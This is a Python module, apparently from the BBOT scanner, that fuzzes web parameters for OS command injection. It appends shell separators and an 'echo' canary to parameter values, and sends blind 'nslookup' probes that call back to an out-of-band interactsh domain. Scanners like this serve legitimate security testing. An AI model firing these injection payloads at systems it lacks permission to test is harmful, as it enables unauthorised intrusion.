from bbot.errors import HttpCompareError
from .base import BaseLightfuzz

import urllib.parse


class CmdILightFuzz(BaseLightfuzz):

    async def fuzz(self):

        cookies = self.event.data.get("assigned_cookies", {})
        original_value = self.event.data.get("original_value", None)
        if original_value is not None and len(original_value) != 0:
            probe_value = original_value
        else:
            probe_value = self.lightfuzz.helpers.rand_string(8, numeric_only=True)

        canary = self.lightfuzz.helpers.rand_string(8, numeric_only=True)
        http_compare = self.compare_baseline(self.event.data["type"], probe_value, cookies)

        cmdi_probe_strings = [
            "AAAA",
            ";",
            "&&",
            "||",
            "&",
            "|",
        ]

        positive_detections = []
        for p in cmdi_probe_strings:
            try:
                echo_probe = f"{probe_value}{p} echo {canary} {p}"
                if self.event.data["type"] == "GETPARAM":
                    echo_probe = urllib.parse.quote(echo_probe.encode(), safe="")
                cmdi_probe = await self.compare_probe(http_compare, self.event.data["type"], echo_probe, cookies)
                if cmdi_probe[3]:
                    if canary in cmdi_probe[3].text and "echo" not in cmdi_probe[3].text:
                        self.lightfuzz.debug(f"canary [{canary}] found in response when sending probe [{p}]")
                        if p == "AAAA":
                            self.lightfuzz.hugewarning(
                                f"False Postive Probe appears to have been triggered for {self.event.data['url']}, aborting remaining detection"
                            )
                            return
                        positive_detections.append(p)
            except HttpCompareError as e:
                self.lightfuzz.debug(e)
                continue

        if len(positive_detections) > 0:
            self.results.append(
                {
                    "type": "FINDING",
                    "description": f"POSSIBLE OS Command Injection. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [echo canary] CMD Probe Delimeters: [{' '.join(positive_detections)}]",
                }
            )

        # Blind OS Command Injection

        if self.lightfuzz.interactsh_instance:
            self.lightfuzz.event_dict[self.event.data["url"]] = self.event
            for p in cmdi_probe_strings:
                subdomain_tag = self.lightfuzz.helpers.rand_string(4, digits=False)
                self.lightfuzz.interactsh_subdomain_tags[subdomain_tag] = {
                    "event": self.event,
                    "type": self.event.data["type"],
                    "name": self.event.data["name"],
                    "probe": p,
                }
                interactsh_probe = f"{p} nslookup {subdomain_tag}.{self.lightfuzz.interactsh_domain} {p}"

                if self.event.data["type"] == "GETPARAM":
                    interactsh_probe = urllib.parse.quote(interactsh_probe.encode(), safe="")
                await self.standard_probe(
                    self.event.data["type"], cookies, f"{probe_value}{interactsh_probe}", timeout=15
                )
